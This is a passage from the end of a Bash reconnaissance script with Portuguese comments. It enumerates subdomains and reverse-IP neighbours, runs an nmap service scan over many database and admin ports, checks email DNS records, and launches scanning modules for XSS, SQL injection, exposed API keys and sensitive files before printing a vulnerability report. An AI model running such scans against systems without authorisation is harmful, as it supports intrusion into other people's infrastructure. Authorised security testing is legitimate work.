      [ "$SIP" != "$IP" ] && v "Subdomain IP diferente: $sub.$DOMAIN -> $SIP" || s "$sub.$DOMAIN -> $SIP"
    fi
    ) &
    [ $(jobs -r | wc -l) -ge 20 ] && wait
  done
  wait
  curl -s --max-time 12 "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" 2>/dev/null | grep -v "error\|limit\|API" | head -15 | while read l; do s "HT: $l"; done
}

# ── REVERSE IP ────────────────────────────────────────────────

reverse_scan(){
  t "REVERSE IP"
  host "$IP" 2>/dev/null | while read l; do s "PTR: $l"; done
  curl -s --max-time 8 "https://api.hackertarget.com/reverseiplookup/?q=$IP" 2>/dev/null | grep -v "error\|limit\|API" | head -15 | while read d; do [ -n "$d" ] && s "$d"; done
}

# ── NMAP FULL ────────────────────────────────────────────────

nmap_scan(){
  t "NMAP SERVICE SCAN"
  nmap -sV --open -T4 --min-rate 2000 -p 21,22,23,25,53,80,110,143,443,445,993,995,1433,1521,2181,2379,3000,3306,3389,5432,5601,5672,5984,6379,6432,7474,7687,8080,8086,8123,8443,8888,8983,9090,9200,9300,11211,15672,27017,28015,33060 "$IP" 2>/dev/null | grep -vE "^#|Starting Nmap|scan report|Not shown|Nmap done" | while read l; do
    [ -n "$l" ] && s "$l"
  done
}

# ── EMAIL OSINT ───────────────────────────────────────────────

email_scan(){
  t "EMAIL OSINT"
  s "SPF:   $(dig +short "$DOMAIN" TXT 2>/dev/null | grep -i spf | head -1)"
  s "DMARC: $(dig +short "_dmarc.$DOMAIN" TXT 2>/dev/null | head -1)"
  for sel in default google selector1 selector2 k1 mail dkim s1 2024 2025; do
    D=$(dig +short "${sel}._domainkey.$DOMAIN" TXT 2>/dev/null)
    [ -n "$D" ] && s "DKIM $sel: $D"
  done
}

# ================================================================
#  EXECUCAO PARALELA DOS MODULOS
# ================================================================

echo ""
i "Iniciando scan de $DOMAIN ($IP)..."
echo ""

# Modulos rapidos em paralelo
geo_scan &
dns_scan &
whois_scan &
hidden_ip_scan &
http_scan &
ssl_scan &
reverse_scan &
email_scan &
subdomain_scan &
wait

# Modulos de scan ativos (requerem sequencia)
cors_scan
redir_scan
sensitive_scan
cms_scan &
xss_scan &
sqli_scan &
apikey_scan &
wait

# Scans pesados
db_scan
file_scan
dir_scan
nmap_scan

# ================================================================
#  RELATORIO FINAL
# ================================================================

echo ""
echo "================================================" | tee -a "$LOG"
i "RELATORIO FINAL - $DOMAIN ($IP)"
echo "Vulnerabilidades encontradas: $VULN" | tee -a "$LOG"
echo ""
if [ ${#URLS[@]} -gt 0 ]; then
  echo -e "${R}[VULNS/URLS]:${N}" | tee -a "$LOG"
  for u in "${URLS[@]}"; do echo -e "  ${C}$u${N}" | tee -a "$LOG"; done
fi
echo ""
i "Log salvo: $LOG"
echo "================================================" | tee -a "$LOG"
